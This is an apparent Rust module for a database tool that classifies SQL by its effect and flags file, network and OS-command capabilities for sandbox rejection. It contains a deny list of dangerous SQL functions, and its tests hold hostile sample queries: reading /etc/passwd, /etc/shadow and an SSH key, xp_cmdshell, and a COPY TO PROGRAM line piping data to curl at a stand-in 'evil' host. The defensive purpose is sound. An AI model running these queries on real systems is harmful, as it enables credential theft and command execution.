use serde::Serialize;
use sqlparser::dialect::{
    BigQueryDialect, ClickHouseDialect, DuckDbDialect, GenericDialect, MsSqlDialect, MySqlDialect,
    PostgreSqlDialect, SQLiteDialect, SnowflakeDialect,
};
use sqlparser::parser::Parser;

use crate::database::models::DatabaseType;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum SqlStatementKind {
    Read,
    Write,
    Schema,
    Session,
    Transaction,
    Unknown,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct SqlStatementDecision {
    pub sql: String,
    pub kind: SqlStatementKind,
    pub read_only: bool,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct SqlSafetyDecision {
    pub statements: Vec<SqlStatementDecision>,
    pub read_only: bool,
    pub has_schema_mutation: bool,
    pub parse_error: Option<String>,
    /// True when the SQL reaches the local filesystem, the network, or an OS
    /// command through a dialect capability (e.g. `pg_read_file`, DuckDB
    /// `read_csv`, MySQL `INTO OUTFILE`, Postgres `COPY ... TO PROGRAM`). Such
    /// SQL is a data-exfiltration / code-execution vector even when it is
    /// otherwise a plain read, so the sandbox boundary rejects it regardless of
    /// [`SqlStatementKind`]. Surfaced to the UI so it can warn before sending.
    #[serde(default)]
    pub filesystem_access: bool,
}

/// Classifies a parsed statement by its real effect instead of its leading
/// keyword. The old first-keyword check let `SELECT ... INTO`, `COPY` file
/// transfers, `EXPLAIN ANALYZE <write>`, and data-modifying CTEs pass as
/// reads; walking the AST closes that hole for every consumer of
/// [`SqlSafetyDecision::read_only`].
fn ast_statement_kind(statement: &sqlparser::ast::Statement) -> SqlStatementKind {
    use sqlparser::ast::Statement as S;
    match statement {
        S::Query(query) => ast_query_kind(query),
        S::ExplainTable { .. } => SqlStatementKind::Read,
        S::Explain {
            analyze,
            statement,
            options,
            ..
        } => {
            // EXPLAIN ANALYZE executes the wrapped statement; a plain EXPLAIN
            // only plans it, but a read-only surface must not plan writes
            // either — both inherit the wrapped kind when it is not a read.
            let executes = *analyze
                || options.as_ref().is_some_and(|opts| {
                    opts.iter()
                        .any(|opt| opt.name.value.eq_ignore_ascii_case("analyze"))
                });
            let inner = ast_statement_kind(statement);
            if executes || inner != SqlStatementKind::Read {
                inner
            } else {
                SqlStatementKind::Read
            }
        }
        S::Insert(_)
        | S::Update { .. }
        | S::Delete(_)
        | S::Merge { .. }
        | S::Copy { .. }
        | S::CopyIntoSnowflake { .. }
        | S::LoadData { .. }
        | S::Unload { .. }
        | S::LockTables { .. }
        | S::UnlockTables
        | S::OptimizeTable { .. }
        | S::Msck { .. }
        | S::Analyze { .. }
        | S::Truncate { .. }
        | S::Install { .. }
        | S::Load { .. }
        | S::Directory { .. }
        | S::List(_)
        | S::Remove(_)
        | S::Cache { .. }
        | S::UNCache { .. }
        | S::Call(_)
        | S::Execute { .. }
        | S::Flush { .. } => SqlStatementKind::Write,
        S::CreateView { .. }
        | S::CreateTable(_)
        | S::CreateVirtualTable { .. }
        | S::CreateIndex(_)
        | S::CreateRole { .. }
        | S::CreateSecret { .. }
        | S::CreateServer(_)
        | S::CreatePolicy { .. }
        | S::CreateConnector(_)
        | S::AlterTable { .. }
        | S::AlterIndex { .. }
        | S::AlterView { .. }
        | S::AlterType(_)
        | S::AlterRole { .. }
        | S::AlterPolicy { .. }
        | S::AlterConnector { .. }
        | S::DetachDuckDBDatabase { .. }
        | S::Drop { .. }
        | S::DropFunction { .. }
        | S::DropDomain(_)
        | S::DropProcedure { .. }
        | S::DropSecret { .. }
        | S::DropPolicy { .. }
        | S::DropConnector { .. }
        | S::CreateExtension { .. }
        | S::DropExtension { .. }
        | S::CreateSchema { .. }
        | S::CreateDatabase { .. }
        | S::CreateFunction(_)
        | S::CreateTrigger { .. }
        | S::DropTrigger { .. }
        | S::CreateProcedure { .. }
        | S::CreateMacro { .. }
        | S::CreateStage { .. }
        | S::CreateSequence { .. }
        | S::CreateDomain(_)
        | S::CreateType { .. }
        | S::RenameTable(_)
        | S::Comment { .. } => SqlStatementKind::Schema,
        S::Set(_)
        // ATTACH mounts an external database file/URI into the session — a
        // file/network read that must not pass the read-only boundary, so it
        // is Session (blocked by the sandbox), not Schema.
        | S::AttachDatabase { .. }
        | S::AttachDuckDBDatabase { .. }
        | S::Use(_)
        | S::Grant { .. }
        | S::Deny(_)
        | S::Revoke { .. }
        | S::AlterSession { .. }
        | S::Prepare { .. }
        | S::Deallocate { .. }
        | S::Declare { .. }
        | S::Fetch { .. }
        | S::Open(_)
        | S::Close { .. }
        | S::Discard { .. }
        | S::LISTEN { .. }
        | S::UNLISTEN { .. }
        | S::NOTIFY { .. } => SqlStatementKind::Session,
        S::StartTransaction { .. }
        | S::Commit { .. }
        | S::Rollback { .. }
        | S::Savepoint { .. }
        | S::ReleaseSavepoint { .. } => SqlStatementKind::Transaction,
        S::Pragma { name, value, is_eq } => {
            // `PRAGMA name` reads; `name = v` assigns; `name(v)` is ambiguous —
            // only the known read-only pragma functions stay reads.
            const READONLY_PRAGMAS: &[&str] = &[
                "table_info",
                "table_xinfo",
                "index_info",
                "index_list",
                "index_xinfo",
                "foreign_key_list",
                "database_list",
                "compile_options",
                "integrity_check",
                "quick_check",
                "foreign_key_check",
                "collation_list",
                "function_list",
                "module_list",
                "pragma_list",
                "table_list",
            ];
            let pragma_name = name.to_string().to_ascii_lowercase();
            if *is_eq || (value.is_some() && !READONLY_PRAGMAS.contains(&pragma_name.as_str())) {
                SqlStatementKind::Session
            } else {
                SqlStatementKind::Read
            }
        }
        S::ShowFunctions { .. }
        | S::ShowVariable { .. }
        | S::ShowStatus { .. }
        | S::ShowVariables { .. }
        | S::ShowCreate { .. }
        | S::ShowColumns { .. }
        | S::ShowDatabases { .. }
        | S::ShowSchemas { .. }
        | S::ShowObjects(_)
        | S::ShowTables { .. }
        | S::ShowViews { .. }
        | S::ShowCollation { .. } => SqlStatementKind::Read,
        _ => SqlStatementKind::Unknown,
    }
}

/// Kind of a `SELECT`-shaped [`sqlparser::ast::Query`]. `SELECT ... INTO`
/// creates a table and data-modifying CTE bodies (`WITH x AS (DELETE …)`)
/// write even though the outer statement reads.
fn ast_query_kind(query: &sqlparser::ast::Query) -> SqlStatementKind {
    if let Some(with) = &query.with {
        for cte in &with.cte_tables {
            if ast_query_kind(&cte.query) != SqlStatementKind::Read {
                return SqlStatementKind::Write;
            }
        }
    }
    ast_set_expr_kind(&query.body)
}

fn ast_set_expr_kind(body: &sqlparser::ast::SetExpr) -> SqlStatementKind {
    use sqlparser::ast::SetExpr as E;
    match body {
        E::Select(select) => {
            if select.into.is_some() {
                SqlStatementKind::Write
            } else {
                SqlStatementKind::Read
            }
        }
        E::Query(query) => ast_query_kind(query),
        E::SetOperation { left, right, .. } => {
            if ast_set_expr_kind(left) == SqlStatementKind::Read
                && ast_set_expr_kind(right) == SqlStatementKind::Read
            {
                SqlStatementKind::Read
            } else {
                SqlStatementKind::Write
            }
        }
        E::Values(_) | E::Table(_) => SqlStatementKind::Read,
        E::Insert(_) | E::Update(_) | E::Delete(_) => SqlStatementKind::Write,
    }
}

/// Parse once at the backend boundary and provide the canonical safety decision used by
/// the editor, AI tools, MCP, timeouts, and schema-cache invalidation.
pub fn classify_sql(sql: &str) -> SqlSafetyDecision {
    classify_sql_with_dialect(sql, None)
}

/// Names of SQL functions that read/write LOCAL FILES, reach the NETWORK, or
/// run OS COMMANDS. Any of these turns an otherwise "read-only" SELECT into a
/// data-exfiltration or code-execution vector, so the sandbox boundary must
/// reject them regardless of the statement kind — the SQL-layer analog of a
/// filesystem/network sandbox. Names are compared case-insensitively and only
/// when written as a call (`name(`), so a plain column/table identifier or a
/// string literal that merely mentions the word is not flagged.
const DANGEROUS_SQL_FUNCTIONS: &[&str] = &[
    // PostgreSQL server-side file + large-object access
    "PG_READ_FILE",
    "PG_READ_BINARY_FILE",
    "PG_LS_DIR",
    "PG_STAT_FILE",
    "PG_LS_LOGDIR",
    "PG_LS_WALDIR",
    "PG_LS_TMPDIR",
    "LO_IMPORT",
    "LO_EXPORT",
    "LO_GET",
    "LO_PUT",
    "LO_FROM_BYTEA",
    // MySQL / MariaDB
    "LOAD_FILE",
    // DuckDB local-file + network scanners / writers
    "READ_CSV",
    "READ_CSV_AUTO",
    "READ_PARQUET",
    "READ_JSON",
    "READ_JSON_AUTO",
    "READ_NDJSON",
    "READ_NDJSON_AUTO",
    "READ_TEXT",
    "READ_BLOB",
    "READ_DATABASE",
    "PARQUET_SCAN",
    "CSV_SCAN",
    "GLOB",
    "WRITE_CSV",
    "WRITE_PARQUET",
    "WRITE_JSON",
];

/// Dangerous names that are invoked WITHOUT requiring a call syntax — SQL Server
/// extended/OLE stored procedures (`EXEC xp_cmdshell 'whoami'`) and ad-hoc
/// remote data sources. Matched as a bare, word-bounded token so a real call is
/// caught whether or not it carries parentheses, while a longer identifier
/// (`xp_cmdshell_log`) is not.
const DANGEROUS_SQL_KEYWORDS: &[&str] = &[
    "XP_CMDSHELL",
    "SP_OACREATE",
    "SP_OAMETHOD",
    "OPENROWSET",
    "OPENDATASOURCE",
    "OPENQUERY",
];

fn is_word_byte(byte: u8) -> bool {
    byte.is_ascii_alphanumeric() || byte == b'_'
}

/// True when `token_upper` appears in `normalized_upper` as a standalone,
/// word-bounded token (non-word char on both sides), independent of any
/// following `(`. Used for capabilities that can be invoked without a call.
fn contains_bare_token(normalized_upper: &str, token_upper: &str) -> bool {
    let bytes = normalized_upper.as_bytes();
    for (pos, _) in normalized_upper.match_indices(token_upper) {
        let before_ok = pos == 0 || !is_word_byte(bytes[pos - 1]);
        let end = pos + token_upper.len();
        let after_ok = end >= bytes.len() || !is_word_byte(bytes[end]);
        if before_ok && after_ok {
            return true;
        }
    }
    false
}

/// True when `name_upper` appears in `normalized_upper` as a FUNCTION CALL:
/// bounded by a non-word char on the left, not glued to another word on the
/// right, and followed (past optional spaces) by `(`. `normalized_upper` must be
/// whitespace-collapsed + uppercased. This keeps `my_read_csv(` and the literal
/// `'read_csv'` from matching `READ_CSV`.
fn contains_function_call(normalized_upper: &str, name_upper: &str) -> bool {
    let bytes = normalized_upper.as_bytes();
    for (pos, _) in normalized_upper.match_indices(name_upper) {
        let before_ok = pos == 0 || !is_word_byte(bytes[pos - 1]);
        let end = pos + name_upper.len();
        let after_word_ok = end >= bytes.len() || !is_word_byte(bytes[end]);
        let mut cursor = end;
        while cursor < bytes.len() && bytes[cursor] == b' ' {
            cursor += 1;
        }
        let followed_by_paren = cursor < bytes.len() && bytes[cursor] == b'(';
        if before_ok && after_word_ok && followed_by_paren {
            return true;
        }
    }
    false
}

/// Returns a human-readable reason when the SQL uses a filesystem/network/OS
/// capability that the sandbox must reject, or `None` when it is clean.
/// Detection is intentionally FAIL-CLOSED and dialect-agnostic (a capability
/// dangerous in one engine is rejected everywhere) so a mis-set connection type
/// can never widen the boundary.
pub fn detect_dangerous_capability(
    sql: &str,
    _database_type: Option<DatabaseType>,
) -> Option<String> {
    // Comments are stripped BEFORE matching because `pg_/**/read_file`,
    // `INTO/**/OUTFILE`, `xp_/**/cmdshell`, and `LOAD#x\nDATA INFILE` all
    // evade a scan of the raw text. Two views are needed: deleting comments
    // outright joins tokens split by a comment (`pg_/**/read_file` →
    // `pg_read_file`), while substituting a space keeps clause phrases intact
    // (`INTO/**/OUTFILE` → `INTO OUTFILE`). Checking both catches either
    // evasion shape.
    let joined = strip_sql_comments(sql, "");
    let spaced = strip_sql_comments(sql, " ");
    for source in [joined.as_str(), spaced.as_str()] {
        let normalized = source
            .split_whitespace()
            .collect::<Vec<_>>()
            .join(" ")
            .to_ascii_uppercase();
        if normalized.is_empty() {
            continue;
        }
        if let Some(reason) = detect_dangerous_capability_normalized(&normalized) {
            return Some(reason);
        }
    }
    None
}

/// Capability matchers over whitespace-collapsed, uppercased SQL. The caller
/// must strip comments first (see [`detect_dangerous_capability`]).
fn detect_dangerous_capability_normalized(normalized: &str) -> Option<String> {
    // Clause-style capabilities.
    if normalized.contains("INTO OUTFILE") || normalized.contains("INTO DUMPFILE") {
        return Some("writes to a server-side file via INTO OUTFILE/DUMPFILE".to_string());
    }
    if normalized.contains("TO PROGRAM") || normalized.contains("FROM PROGRAM") {
        return Some("pipes data through an OS command via COPY ... PROGRAM".to_string());
    }
    if normalized.contains("LOAD DATA") && normalized.contains("INFILE") {
        return Some("reads a server-side file via LOAD DATA INFILE".to_string());
    }
    if normalized.contains("COPY")
        && (normalized.contains(" TO '") || normalized.contains(" FROM '"))
    {
        return Some(
            "reads or writes a server-side file via COPY ... TO/FROM '<path>'".to_string(),
        );
    }
    if normalized.starts_with("UNLOAD") && normalized.contains(" TO '") {
        return Some("writes query results to external storage via UNLOAD ... TO".to_string());
    }

    // Function-call-style capabilities.
    for name in DANGEROUS_SQL_FUNCTIONS {
        if contains_function_call(normalized, name) {
            return Some(format!(
                "calls the file/network/OS function {}()",
                name.to_ascii_lowercase()
            ));
        }
    }

    // Bare-token capabilities (extended procedures / ad-hoc remote sources).
    for keyword in DANGEROUS_SQL_KEYWORDS {
        if contains_bare_token(normalized, keyword) {
            return Some(format!(
                "invokes the extended procedure / remote source {}",
                keyword.to_ascii_lowercase()
            ));
        }
    }
    None
}

/// Dialect-aware classification. MySQL-family engines expose server commands
/// (`SHOW FULL PROCESSLIST`, `DESCRIBE t`, …) that the generic parser cannot
/// read; parsing them with the connection's real dialect (plus a read-only
/// fallback for those inherently read-only server commands) keeps admin
/// presets from being rejected as PARSE_ERR. Also stamps [`SqlSafetyDecision::filesystem_access`]
/// so callers see the sandbox-relevant capability without re-scanning the text.
pub fn classify_sql_with_dialect(
    sql: &str,
    database_type: Option<DatabaseType>,
) -> SqlSafetyDecision {
    let mut decision = classify_sql_dialect_inner(sql, database_type);
    decision.filesystem_access = detect_dangerous_capability(sql, database_type).is_some();
    decision
}

fn classify_sql_dialect_inner(sql: &str, database_type: Option<DatabaseType>) -> SqlSafetyDecision {
    let dialect = sql_dialect_for(database_type);
    match Parser::parse_sql(&*dialect, sql) {
        Ok(parsed) if parsed.is_empty() => SqlSafetyDecision {
            statements: Vec::new(),
            read_only: false,
            has_schema_mutation: false,
            parse_error: Some("SQL contains no executable statements.".to_string()),
            filesystem_access: false,
        },
        Ok(parsed) => {
            let statements = parsed
                .into_iter()
                .map(|statement| {
                    let kind = ast_statement_kind(&statement);
                    SqlStatementDecision {
                        sql: statement.to_string(),
                        kind,
                        read_only: kind == SqlStatementKind::Read,
                    }
                })
                .collect::<Vec<_>>();
            SqlSafetyDecision {
                read_only: statements.iter().all(|statement| statement.read_only),
                has_schema_mutation: statements
                    .iter()
                    .any(|statement| statement.kind == SqlStatementKind::Schema),
                statements,
                parse_error: None,
                filesystem_access: false,
            }
        }
        Err(error) => {
            // MySQL-family server commands (SHOW FULL PROCESSLIST, DESCRIBE t,
            // EXPLAIN SELECT …) are inherently read-only; when the real
            // dialect still fails to parse them, classify as read instead of
            // PARSE_ERR so admin presets work on MySQL/MariaDB.
            if is_mysql_family(database_type)
                && split_sql_statements(sql)
                    .iter()
                    .filter(|statement| !strip_leading_comments(statement).is_empty())
                    .all(|statement| is_mysql_readonly_server_command(statement))
            {
                let statements = split_sql_statements(sql)
                    .into_iter()
                    .filter_map(|statement| {
                        if strip_leading_comments(&statement).is_empty() {
                            return None;
                        }
                        Some(SqlStatementDecision {
                            sql: statement,
                            kind: SqlStatementKind::Read,
                            read_only: true,
                        })
                    })
                    .collect::<Vec<_>>();
                if !statements.is_empty() {
                    return SqlSafetyDecision {
                        read_only: true,
                        has_schema_mutation: false,
                        statements,
                        parse_error: None,
                        filesystem_access: false,
                    };
                }
            }
            let statements = split_sql_statements(sql)
                .into_iter()
                .filter_map(|statement| {
                    let cleaned = strip_leading_comments(&statement);
                    if cleaned.is_empty() {
                        return None;
                    }
                    Some(SqlStatementDecision {
                        sql: statement,
                        kind: SqlStatementKind::Unknown,
                        read_only: false,
                    })
                })
                .collect();
            SqlSafetyDecision {
                statements,
                read_only: false,
                has_schema_mutation: false,
                parse_error: Some(error.to_string()),
                filesystem_access: false,
            }
        }
    }
}

/// Maps a connection's engine to the matching sqlparser dialect so server
/// commands (`SHOW …`, `DESCRIBE …`) parse under the grammar that owns them.
pub fn sql_dialect_for(
    database_type: Option<DatabaseType>,
) -> Box<dyn sqlparser::dialect::Dialect> {
    match database_type {
        Some(DatabaseType::MySQL) | Some(DatabaseType::MariaDB) => Box::new(MySqlDialect {}),
        Some(DatabaseType::PostgreSQL)
        | Some(DatabaseType::CockroachDB)
        | Some(DatabaseType::Greenplum)
        | Some(DatabaseType::Redshift) => Box::new(PostgreSqlDialect {}),
        Some(DatabaseType::MSSQL) => Box::new(MsSqlDialect {}),
        Some(DatabaseType::SQLite)
        | Some(DatabaseType::LibSQL)
        | Some(DatabaseType::CloudflareD1) => Box::new(SQLiteDialect {}),
        Some(DatabaseType::DuckDB) => Box::new(DuckDbDialect {}),
        Some(DatabaseType::BigQuery) => Box::new(BigQueryDialect {}),
        Some(DatabaseType::Snowflake) => Box::new(SnowflakeDialect {}),
        Some(DatabaseType::ClickHouse) => Box::new(ClickHouseDialect {}),
        _ => Box::new(GenericDialect {}),
    }
}

fn is_mysql_family(database_type: Option<DatabaseType>) -> bool {
    matches!(
        database_type,
        Some(DatabaseType::MySQL) | Some(DatabaseType::MariaDB)
    )
}

/// Server commands that are read-only by construction; used only when the
/// MySQL dialect parser still rejects them (coverage gaps like
/// `SHOW FULL PROCESSLIST`).
fn is_mysql_readonly_server_command(statement: &str) -> bool {
    let cleaned = strip_leading_comments(statement);
    let upper = cleaned.to_uppercase();
    upper.starts_with("SHOW ")
        || upper.starts_with("SHOW;")
        || upper == "SHOW"
        || upper.starts_with("DESCRIBE ")
        || upper == "DESCRIBE"
        || upper.starts_with("DESC ")
        || upper == "DESC"
        || upper.starts_with("EXPLAIN ")
        || upper == "EXPLAIN"
}

fn strip_leading_comments(statement: &str) -> &str {
    let mut remaining = statement.trim_start();
    loop {
        if let Some(after_line_comment) = remaining.strip_prefix("--") {
            let Some((_, next_line)) = after_line_comment.split_once('\n') else {
                return "";
            };
            remaining = next_line.trim_start();
            continue;
        }
        if let Some(after_block_comment) = remaining.strip_prefix("/*") {
            let Some(end) = after_block_comment.find("*/") else {
                return "";
            };
            remaining = after_block_comment[end + 2..].trim_start();
            continue;
        }
        return remaining;
    }
}

/// Removes `--`, `#`, and `/* */` comments, substituting `replacement` for
/// each comment body. String literals (`'…'`, `"…"`, `` `…` ``) and
/// dollar-quoted bodies keep only their delimiters — the contents are dropped,
/// so a literal that merely mentions a dangerous name ('xp_cmdshell …') can
/// never false-positive, and a comment inside a literal is never mistaken for
/// a real comment. Mirrors the tokenizer in [`split_sql_statements`].
pub(crate) fn strip_sql_comments(sql: &str, replacement: &str) -> String {
    let mut out = String::with_capacity(sql.len());
    let mut in_string = false;
    let mut string_char = '\0';
    let mut in_line_comment = false;
    let mut in_block_comment = false;
    let mut dollar_quote_tag: Option<String> = None;
    let len = sql.len();
    let mut index = 0usize;

    while index < len {
        let rest = match sql.get(index..) {
            Some(value) => value,
            None => break,
        };
        let mut chars = rest.chars();
        let Some(ch) = chars.next() else {
            break;
        };
        let ch_len = ch.len_utf8();
        let next = chars.next();
        let next_len = next.map(char::len_utf8).unwrap_or(0);

        if in_line_comment {
            if ch == '\n' {
                in_line_comment = false;
                out.push(ch);
            }
            index += ch_len;
            continue;
        }

        if in_block_comment {
            if ch == '*' && next == Some('/') {
                in_block_comment = false;
                index += ch_len + next_len;
            } else {
                index += ch_len;
            }
            continue;
        }
        if let Some(tag) = dollar_quote_tag.as_ref() {
            if sql[index..].starts_with(tag) {
                out.push_str(tag);
                index += tag.len();
                dollar_quote_tag = None;
            } else {
                // Dollar-quoted body contents are masked like string literals.
                index += ch_len;
            }
            continue;
        }

        if !in_string && ch == '-' && next == Some('-') {
            in_line_comment = true;
            out.push_str(replacement);
            index += ch_len + next_len;
            continue;
        }

        // `#` opens a line comment in the MySQL family; elsewhere it cannot
        // appear in valid SQL anyway, so stripping it cannot hide a real call.
        if !in_string && ch == '#' {
            in_line_comment = true;
            out.push_str(replacement);
            index += ch_len;
            continue;
        }

        if !in_string && ch == '/' && next == Some('*') {
            in_block_comment = true;
            out.push_str(replacement);
            index += ch_len + next_len;
            continue;
        }

        if !in_string && ch == '$' {
            if let Some(tag) = match_dollar_quote_tag(sql, index) {
                dollar_quote_tag = Some(tag.clone());
                out.push_str(&tag);
                index += tag.len();
                continue;
            }
        }

        if in_string {
            if ch == '\\' && next.is_some() {
                // Escaped pair inside a literal: consume both, emit none.
                index += ch_len + next_len;
                continue;
            }
            if ch == string_char {
                if next == Some(string_char) {
                    // Doubled quote inside a literal: consume both, emit none.
                    index += ch_len + next_len;
                    continue;
                }
                in_string = false;
                string_char = '\0';
                out.push(ch);
                index += ch_len;
                continue;
            }
            // Literal contents are masked — a dangerous name inside a string
            // is data, not a call site.
            index += ch_len;
            continue;
        }

        if matches!(ch, '\'' | '"' | '`') {
            in_string = true;
            string_char = ch;
            out.push(ch);
            index += ch_len;
            continue;
        }

        out.push(ch);
        index += ch_len;
    }

    out
}

fn match_dollar_quote_tag(sql: &str, start: usize) -> Option<String> {
    let rest = sql.get(start..)?;
    if !rest.starts_with('$') {
        return None;
    }

    let mut chars = rest.char_indices();
    chars.next()?;
    let mut end_index = None;

    for (index, ch) in chars {
        if ch == '$' {
            end_index = Some(index);
            break;
        }

        let is_valid = if index == 1 {
            ch == '_' || ch.is_ascii_alphabetic()
        } else {
            ch == '_' || ch.is_ascii_alphanumeric()
        };

        if !is_valid {
            return if rest.starts_with("$$") {
                Some("$$".to_string())
            } else {
                None
            };
        }
    }

    if let Some(end_index) = end_index {
        return Some(rest[..=end_index].to_string());
    }

    if rest.starts_with("$$") {
        Some("$$".to_string())
    } else {
        None
    }
}

pub fn split_sql_statements(sql: &str) -> Vec<String> {
    let text = sql.trim();
    if text.is_empty() {
        return Vec::new();
    }

    if !text.contains(';') {
        return vec![text.to_string()];
    }

    let mut statements = Vec::new();
    let mut current_start = 0usize;
    let mut in_string = false;
    let mut string_char = '\0';
    let mut in_line_comment = false;
    let mut in_block_comment = false;
    let mut dollar_quote_tag: Option<String> = None;
    let len = sql.len();
    let mut index = 0usize;

    while index < len {
        let rest = match sql.get(index..) {
            Some(value) => value,
            None => break,
        };
        let mut chars = rest.chars();
        let Some(ch) = chars.next() else {
            break;
        };
        let ch_len = ch.len_utf8();
        let next = chars.next();
        let next_len = next.map(char::len_utf8).unwrap_or(0);

        if in_line_comment {
            if ch == '\n' {
                in_line_comment = false;
            }
            index += ch_len;
            continue;
        }

        if in_block_comment {
            if ch == '*' && next == Some('/') {
                in_block_comment = false;
                index += ch_len + next_len;
            } else {
                index += ch_len;
            }
            continue;
        }

        if let Some(tag) = dollar_quote_tag.as_ref() {
            if sql[index..].starts_with(tag) {
                index += tag.len();
                dollar_quote_tag = None;
            } else {
                index += ch_len;
            }
            continue;
        }

        if !in_string && ch == '-' && next == Some('-') {
            in_line_comment = true;
            index += ch_len + next_len;
            continue;
        }

        if !in_string && ch == '/' && next == Some('*') {
            in_block_comment = true;
            index += ch_len + next_len;
            continue;
        }

        if !in_string && ch == '$' {
            if let Some(tag) = match_dollar_quote_tag(sql, index) {
                dollar_quote_tag = Some(tag.clone());
                index += tag.len();
                continue;
            }
        }

        if in_string && ch == '\\' && next.is_some() {
            index += ch_len + next_len;
            continue;
        }

        if matches!(ch, '\'' | '"' | '`') {
            if !in_string {
                in_string = true;
                string_char = ch;
                index += 1;
                continue;
            }

            if ch == string_char {
                if next == Some(string_char) {
                    index += ch_len + next_len;
                } else {
                    in_string = false;
                    string_char = '\0';
                    index += ch_len;
                }
                continue;
            }
        }

        if ch == ';' && !in_string {
            let statement = sql[current_start..index].trim();
            if !statement.is_empty() {
                statements.push(statement.to_string());
            }
            current_start = index + 1;
        }

        index += ch_len;
    }

    let last_statement = sql[current_start..].trim();
    if !last_statement.is_empty() {
        statements.push(last_statement.to_string());
    }

    statements
}

#[cfg(test)]
mod tests {
    use super::{
        classify_sql, classify_sql_with_dialect, detect_dangerous_capability, split_sql_statements,
        SqlStatementKind,
    };
    use crate::database::models::DatabaseType;
    use serde::Deserialize;

    #[derive(Debug, Deserialize)]
    struct SqlSplitterFixture {
        name: String,
        sql: String,
        expected: Vec<String>,
    }

    #[test]
    fn sql_splitter_contract() {
        let fixtures: Vec<SqlSplitterFixture> = serde_json::from_str(include_str!(
            "../../../fixtures/sql_statement_splitter_cases.json"
        ))
        .expect("shared SQL splitter fixtures should parse");

        for fixture in fixtures {
            let actual = split_sql_statements(&fixture.sql);
            assert_eq!(
                actual, fixture.expected,
                "split_sql_statements mismatch for fixture {}",
                fixture.name
            );
        }
    }

    #[derive(Debug, Deserialize)]
    struct SqlClassificationContract {
        cases: Vec<SqlClassificationCase>,
    }

    #[derive(Debug, Deserialize)]
    struct SqlClassificationCase {
        sql: String,
        #[serde(rename = "readOnly")]
        read_only: bool,
    }

    #[test]
    fn frontend_backend_sql_classification_contract() {
        // Backend half of the FE<->BE contract (tech-debt audit D6): the same
        // fixture is asserted on the frontend by
        // tests/utils/sql-classification-contract.test.ts. If either classifier
        // drifts on these shared statements, its own side fails.
        let contract: SqlClassificationContract = serde_json::from_str(include_str!(
            "../../../tests/fixtures/sql-classification-contract.json"
        ))
        .expect("shared SQL classification contract should parse");

        for case in contract.cases {
            let decision = classify_sql_with_dialect(&case.sql, None);
            assert_eq!(
                decision.read_only, case.read_only,
                "classify_sql_with_dialect read_only mismatch for `{}`",
                case.sql
            );
        }
    }

    #[test]
    fn classifier_handles_comments_ctes_and_multiple_statements() {
        let decision = classify_sql(
            "-- inspect\nWITH visible AS (SELECT * FROM users) SELECT * FROM visible; SELECT 2",
        );
        assert!(decision.parse_error.is_none());
        assert!(decision.read_only);
        assert_eq!(decision.statements.len(), 2);
    }

    #[test]
    fn classifier_rejects_mutating_ctes_as_read_only() {
        let decision =
            classify_sql("WITH changed AS (DELETE FROM users RETURNING id) SELECT * FROM changed");
        assert!(!decision.read_only);
        assert_eq!(decision.statements[0].kind, SqlStatementKind::Write);
    }

    #[test]
    fn classifier_distinguishes_schema_and_transaction_sql() {
        let schema = classify_sql("ALTER TABLE users ADD COLUMN active BOOLEAN");
        assert!(schema.has_schema_mutation);
        assert_eq!(schema.statements[0].kind, SqlStatementKind::Schema);

        let transaction = classify_sql("BEGIN; SELECT 1; COMMIT");
        assert!(!transaction.read_only);
        assert_eq!(
            transaction.statements[0].kind,
            SqlStatementKind::Transaction
        );
    }

    #[test]
    fn classifier_does_not_treat_comment_only_sql_as_read_only() {
        let decision = classify_sql("-- nothing to execute");
        assert!(!decision.read_only);
        assert!(decision.statements.is_empty());
        assert!(decision.parse_error.is_some());
    }

    #[test]
    fn dangerous_capability_flags_filesystem_and_network_functions() {
        // Each of these turns a "read" into local-file / network / OS access.
        let cases = [
            "SELECT pg_read_file('/etc/passwd')",
            "SELECT PG_LS_DIR('/var/lib')",
            "SELECT lo_import('/etc/shadow')",
            "SELECT load_file('/etc/passwd')",
            "SELECT * FROM read_csv('/home/u/.ssh/id_rsa')",
            "SELECT * FROM read_parquet('s3://bucket/x')",
            "SELECT * FROM glob('/etc/*')",
            "SELECT * FROM openrowset(BULK '/etc/passwd', SINGLE_CLOB) AS x",
            "EXEC xp_cmdshell 'whoami'",
        ];
        for sql in cases {
            assert!(
                detect_dangerous_capability(sql, None).is_some(),
                "expected dangerous-capability detection for: {sql}"
            );
        }
    }

    #[test]
    fn dangerous_capability_flags_file_export_and_program_clauses() {
        assert!(
            detect_dangerous_capability("SELECT * FROM users INTO OUTFILE '/tmp/u.csv'", None)
                .is_some()
        );
        assert!(detect_dangerous_capability(
            "COPY (SELECT * FROM users) TO PROGRAM 'curl http://evil'",
            None
        )
        .is_some());
        assert!(
            detect_dangerous_capability("LOAD DATA INFILE '/etc/passwd' INTO TABLE t", None)
                .is_some()
        );
    }

    #[test]
    fn dangerous_capability_does_not_flag_lookalike_identifiers_or_literals() {
        // A column/table whose name merely contains a flagged word, and a plain
        // string literal, must NOT be blocked — only real call sites.
        let clean = [
            "SELECT read_csv_notes FROM reports",
            "SELECT my_read_csv(id) FROM t",
            "SELECT 'pg_read_file is a function' AS note",
            "SELECT load_file_status FROM jobs",
            "SELECT id, name FROM users WHERE active = TRUE",
        ];
        for sql in clean {
            assert!(
                detect_dangerous_capability(sql, None).is_none(),
                "false positive dangerous-capability detection for: {sql}"
            );
        }
    }

    #[test]
    fn classify_stamps_filesystem_access_flag() {
        let flagged = classify_sql_with_dialect(
            "SELECT pg_read_file('/etc/passwd')",
            Some(DatabaseType::PostgreSQL),
        );
        assert!(flagged.filesystem_access);

        let clean =
            classify_sql_with_dialect("SELECT id FROM users", Some(DatabaseType::PostgreSQL));
        assert!(!clean.filesystem_access);
    }

    #[test]
    fn classifier_rejects_select_into_as_read_only() {
        for sql in [
            "SELECT * INTO backup FROM users",
            "SELECT id INTO TEMP t FROM users",
        ] {
            let decision = classify_sql(sql);
            assert!(!decision.read_only, "SELECT INTO leaked as read: {sql}");
            assert_eq!(decision.statements[0].kind, SqlStatementKind::Write);
        }
    }

    #[test]
    fn classifier_rejects_explain_analyze_writes() {
        let analyzed = classify_sql("EXPLAIN ANALYZE DELETE FROM users");
        assert!(!analyzed.read_only);
        assert_eq!(analyzed.statements[0].kind, SqlStatementKind::Write);

        // A plain EXPLAIN of a write is still not a read on a read-only surface.
        let planned = classify_sql("EXPLAIN INSERT INTO users VALUES (1)");
        assert!(!planned.read_only);

